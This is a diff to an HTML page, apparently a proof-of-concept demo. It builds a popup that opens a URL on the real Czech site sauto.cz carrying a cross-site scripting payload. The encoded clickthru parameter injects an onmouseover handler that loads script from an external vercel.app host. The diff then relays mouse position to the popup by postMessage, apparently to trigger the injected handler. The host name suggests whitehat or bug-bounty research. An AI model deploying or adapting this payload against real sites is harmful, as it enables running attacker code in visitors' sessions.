@@ -29,6 +29,7 @@
 <button autofocus>Klikni na mě</button>
 <pre></pre>
 <script>
+    const externalURL = 'https://www.sauto.cz/bannerova-reklama?perPage=4&banner=1&clickthru=/%22onmouseover=%22let%20s%20=%20document.createElement(%27script%27);%20s.setAttribute(%27src%27,%27https://whitehat-email-cz.vercel.app/index.js%27);%20document.head.appendChild(s)';
     let popupEl = null;
     window.addEventListener(
         "message",
@@ -44,9 +45,10 @@
     });
 
     document.addEventListener('mousemove', (e) => {
-        console.log(e);
+        // console.log(e);
         if (popupEl) {
-            popupEl.moveTo(e.x - 150, e.y - 300);
+            popupEl.postMessage({x: e.x}, 'https://whitehat-email-cz.vercel.app/')
+            // popupEl.moveTo(e.x - 150, e.y - 300);
         }
     })
 
@@ -54,7 +56,7 @@
         const left = x - 150;
         const top = y - 300;
         popupEl = window.open(
-            'https://www.sauto.cz/bannerova-reklama?perPage=4&banner=1&clickthru=/%22onmouseover=%22let%20s%20=%20document.createElement(%27script%27);%20s.setAttribute(%27src%27,%27https://whitehat-email-cz.vercel.app/index.js%27);%20document.head.appendChild(s)',
+            externalURL,
             '_blank',
             "height=600, width=300, resizable=0, scrollbars=0, status=0, titlebar=0, toolbar=0, location=0, menubar=0, left=" + left + ", top=" + top
         );
